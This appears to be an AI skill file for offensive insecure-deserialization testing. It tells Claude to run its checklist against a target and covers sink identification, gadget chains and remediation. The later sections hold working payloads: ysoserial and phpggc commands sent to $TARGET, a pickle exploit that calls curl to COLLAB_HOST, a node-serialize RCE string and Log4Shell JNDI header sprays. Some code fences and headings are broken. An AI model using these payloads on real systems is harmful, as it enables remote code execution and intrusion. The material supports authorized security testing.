---
name: deserialization-testing
description: Deserialization vulnerability testing: Java, Python, PHP, Ruby. Gadget chains, RCE paths, filter bypass.
---

# SKILL: Insecure Deserialization

## Metadata
- **Skill Name**: insecure-deserialization
- **Folder**: offensive-deserialization
- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/insecure-deserialization.md

## Description
Insecure deserialization attack checklist: identifying deserialization sinks, Java/PHP/.NET/Python deserialization exploitation, ysoserial gadget chains, magic method abuse, and detection evasion. Use when testing deserialization endpoints or developing deserialization exploits.

## Trigger Phrases
Use this skill when the conversation involves any of:
`deserialization, insecure deserialization, ysoserial, Java deserialization, PHP deserialization, .NET deserialization, pickle, gadget chain, magic method, ObjectInputStream`

## Instructions for Claude

When this skill is active:
1. Load and apply the full methodology below as your operational checklist
2. Follow steps in order unless the user specifies otherwise
3. For each technique, consider applicability to the current target/context
4. Track which checklist items have been completed
5. Suggest next steps based on findings

---

## Full Methodology

# Insecure Deserialization

Happens when applications deserialize program objects without proper precaution. An attacker can then manipulate serialized objects to change program behavior and even execute code.

## Shortcut

1. Search source for deserialization that touches user input.
2. If black-box, look for large, opaque blobs (cookies, headers, bodies) and unusual content-types.
3. Identify features that must deserialize user-supplied data (session, jobs/queues, file metadata, tokens).
4. If identity is embedded, tamper to attempt auth bypass.
5. Try to escalate to RCE/logic abuse carefully and non-destructively.

## Mechanisms

- Occurs when user-controlled data is deserialized without strict allowlists and integrity checks. Exploits often occur during deserialization (magic methods, constructors), before app logic runs.
- Prefer data formats that don’t instantiate code (JSON), and disable polymorphic typing.

## Hunt

1.  **Identify Potential Inputs:**
    - HTTP parameters/headers/cookies, file uploads, message queues, caches, DB‑stored user content
2.  **Recognize Serialized Data:**
    - **PHP:** `O:<len>:"Class":...` (often Base64), PHAR archives (`phar://`)
    - **Java:** hex `ac ed 00 05` or Base64 `rO0`; XMLDecoder/XStream flows
    - **.NET:** legacy `BinaryFormatter`/`SoapFormatter` (unsafe/deprecated); Base64 `AAEAAAD/////`
    - **Python:** `pickle` opcodes; unsafe `yaml.load` without `SafeLoader`
    - **Ruby:** `YAML.load` unsafe; use `safe_load`
3.  **Source Review (if available):**
    - **Java:** `ObjectInputStream.readObject`; enable `ObjectInputFilter`, disable Jackson default typing; use allowlists
    - **PHP:** `unserialize()`; file operations that dereference `phar://`
    - **.NET:** avoid `BinaryFormatter`; use `System.Text.Json`
    - **Python:** avoid `pickle` for untrusted data; `yaml.safe_load`
    - **Node.js:** `node-serialize`, `serialize-javascript`, `funcster` with unsafe eval()
    - **Golang:** `encoding/gob` with interface{} type confusion
    - **Ruby:** `Marshal.load()`, `YAML.load()` without `safe_load`
    - **Rust:** `serde` with YAML/bincode, `ron` (Rusty Object Notation)
4.  **Dynamic Analysis:** Intercept and mutate; watch for error stack traces, class names, and timing anomalies.

## Bypass Techniques

1.  **Alternate Gadgets/Classes:** Switch payload chains if blocklists are present.
2.  **Type Confusion:** Change expected types to bypass weak validation.
3.  **Indirect Paths:** Sink data into storage that a different component later deserializes.
4.  **Format Specific:** PHAR wrappers, XML entity tricks, language‑specific unserialize quirks.
5.  **Post‑deserialization Impact:** Abuse magic methods that run before validation.

## Language-Specific Details

### Node.js

- **node-serialize**: RCE via `_$$ND_FUNC$$_` IIFE pattern
  ```javascript
  {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami', function(error, stdout){console.log(stdout)});}()"}
  ```
- **serialize-javascript**: Unsafe eval() when not properly escaped
- **funcster**: Arbitrary function serialization leads to code execution
- **Detection**: Look for `{"_$$ND_FUNC$$_` or serialized function strings in cookies/tokens

### Golang

- **encoding/gob**: Type confusion attacks when using `interface{}` types
  ```go
  // Vulnerable: accepts any type
  var data interface{}
  dec := gob.NewDecoder(buffer)
  dec.Decode(&data)
  ```
- **encoding/json**: Generally safe but Unmarshal into `interface{}` allows unexpected types
- **MessagePack**: Unsafe reflection in `github.com/vmihailenco/msgpack` with custom decoders
- **Mitigation**: Use concrete types, avoid `interface{}` for untrusted data

### Rust

- **serde**: Generally memory-safe but logic bugs possible with custom `Deserialize` implementations
- **bincode**: Binary serialization - ensure versioning and size limits
- **ron** (Rusty Object Notation): Can deserialize into arbitrary types if schema not restricted
- **YAML**: `serde_yaml` with untrusted input can cause DoS via deeply nested structures
- **Best Practice**: Use `#[serde(deny_unknown_fields)]` and explicit type constraints

### Additional Languages

- **Ruby**:
  - `Marshal.load()`: Gadget chains exist (e.g., `Gem::Requirement`, `Gem::RequestSet`)
  - Tools: `Ruby Marshal RCE` (exploit scripts)
- **Python**:
  - `pickle`: Extensive gadget chains, `__reduce__` magic method exploitation
  - `yaml.load()`: Use `yaml.safe_load()` or `yaml.load(data, Loader=yaml.SafeLoader)`
- **Java**:
  - Apache Commons Collections (InvokerTransformer chain)
  - Spring Framework (PropertyPathFactoryBean)
  - Tool: `ysoserial` - generates payloads for 30+ gadget chains

## Modern Attack Vectors

### Container & Kubernetes

- **ConfigMaps/Secrets**: Applications deserializing YAML/JSON from ConfigMaps without validation
- **Admission Webhooks**: Kubernetes admission controllers deserializing `AdmissionReview` objects
  - Test by submitting pods with malicious annotations or labels containing serialized payloads
- **CRD Controllers**: Custom Resource Definitions with unsafe deserialization in reconciliation loops
- **Attack**: Submit malicious Custom Resource → controller deserializes → RCE in cluster

### Message Queues

- **Kafka/RabbitMQ/Redis**: Consumers blindly deserializing messages from queues
  ```python
  # Vulnerable consumer
  msg = consumer.receive()
  data = pickle.loads(msg)  # Attacker controls msg
  ```
- **Testing**: Publish crafted serialized objects to queues if you have producer access
- **Impact**: Compromise all consumers processing the poisoned queue

### Serverless Functions

- **AWS Lambda**: Event payloads deserialized from S3 triggers, SNS, SQS
- **Google Cloud Functions**: HTTP request bodies automatically deserialized
- **Azure Functions**: Blob triggers with automatic deserialization
- **Attack Vector**: Upload malicious serialized object to S3 → Lambda deserializes → RCE in serverless context

### CI/CD Pipelines

- **Jenkins**: Java deserialization in remoting protocol (multiple CVEs)
- **GitLab Runners**: YAML deserialization in `.gitlab-ci.yml` with unsafe anchors/aliases
- **GitHub Actions**: Workflow files with embedded serialized data in custom actions
- **Build Artifacts**: Deserializing cached build objects from untrusted sources

### GraphQL / API Gateways

- **Custom Scalars**: GraphQL custom scalar types deserializing complex objects
- **Input Coercion**: API gateways converting JSON to language objects without validation
- **Batch Operations**: Bulk import/export features deserializing uploaded files

## Vulnerabilities / Impacts

- **RCE via gadget chains**: Execute arbitrary code through chained object instantiation
- **Arbitrary file access**: Read/write files via path traversal in deserialization
- **DoS via resource bombs**: Billion laughs-style attacks with nested objects (zip bombs, XML bombs)
- **Auth bypass via object field tampering**: Modify `is_admin`, `role`, `user_id` fields in session objects
- **Downstream SQLi with tainted fields**: Deserialized objects used in SQL queries without sanitization
- **Memory exhaustion**: Allocate large data structures during deserialization
- **Type juggling attacks**: Language-specific type coercion vulnerabilities

## Methodologies

- Identify → Format → Mutate/Fuzz → Exploit chain → Verify impact safely
- Tools: `ysoserial`, `phpggc`, `ysoserial.net`, Burp Deserialization Scanner, Semgrep rules for dangerous sinks, `marshalsec`, gadget inspectors.

## Remediation Recommendations

1.  Avoid deserializing untrusted input; use JSON with schemas.
2.  Verify integrity first (HMAC/signature) and only then deserialize; reject on mismatch.
3.  Use safe, specific serializers without polymorphic typing; implement allowlists.
4.  Isolate deserialization code under least privilege and sandboxing; timeouts/memory limits.
5.  Keep libraries updated; monitor for anomalies.



---

# Additional Techniques (merged from hunt-deserialization/SKILL.md)

## Crown Jewel Targets

Deserialization bugs are almost always Critical — they lead directly to RCE without prerequisite conditions.

**Highest-value chains:**
- **Java ysoserial gadget chains** — CommonsCollections, Spring, JNDI, Groovy gadgets → full OS command execution
- **PHP Object Injection** — `__wakeup` / `__destruct` magic methods → file write / RCE
- **Python pickle** — `pickle.loads(attacker_data)` → `__reduce__` → `os.system('id')`
- **.NET BinaryFormatter** — TypeConfuseDelegate gadget chain → RCE
- **Ruby Marshal.load** — Gem::Requirement, Gem::Installer gadgets → RCE
- **JNDI injection** — Log4Shell pattern: `${jndi:ldap://attacker/a}` → class load → RCE

---

# Java serialized objects start with AC ED 00 05 (hex) or rO0A (base64)
echo "rO0ABXQ=" | base64 -d | xxd | head -1  # shows: ac ed 00 05

# Apache Shiro: rememberMe cookie present
curl -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"

# Log4j: test user-controlled fields for JNDI interpolation
curl -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
```

### Header / Cookie Signals
```
Content-Type: application/x-java-serialized-object
Cookie containing rO0= prefix (Java base64 serialized)
Cookie: rememberMe= (Apache Shiro)
Cookie: _VIEWSTATE (ASP.NET ViewState without encryption)
Endpoints: /remoting/, /invoker/, /jmx-console/, /wls-wsat/
```

---

# Install ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Generate OOB detection payload
java -jar ysoserial-all.jar CommonsCollections6 \
  'curl http://COLLAB_HOST/ysoserial' | base64 -w0

# Send as body or cookie
java -jar ysoserial-all.jar CommonsCollections6 'id > /tmp/pwned' | base64 | \
  curl -s https://$TARGET/wls-wsat/CoordinatorPortType \
    -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @-

# Craft gadget chain using phpggc
git clone https://github.com/ambionics/phpggc
php phpggc -l  # list chains
php phpggc Laravel/RCE5 system id | base64
```

# Generate OOB payload
python3 -c "
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://COLLAB_HOST/pickle-rce',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"

# Send as cookie or POST body
curl -s https://$TARGET/api/load-model \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.pkl
```

# Test all user-controlled inputs
COLLAB="COLLAB_HOST"
for HEADER in "User-Agent" "X-Forwarded-For" "Referer" "X-Api-Version" "Accept-Language"; do
  curl -s https://$TARGET/ -H "$HEADER: \${jndi:dns://$COLLAB/$HEADER}" &
done

# Test POST body fields
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"\${jndi:ldap://$COLLAB/a}\"}"
```

## Chain Table

| Deserialization signal | Chain to | Impact |
|-----------------------|----------|--------|
| Any deser RCE | /etc/passwd + id output | Prove arbitrary command execution |
| RCE as low-privilege user | Find SUID binaries / sudo rules | Privilege escalation → root |
| Blind RCE (OOB callback) | DNS callback → confirm exec | Sufficient for Critical PoC |
| Log4Shell | LDAP → JNDI → class load | Full RCE on JVM process |

---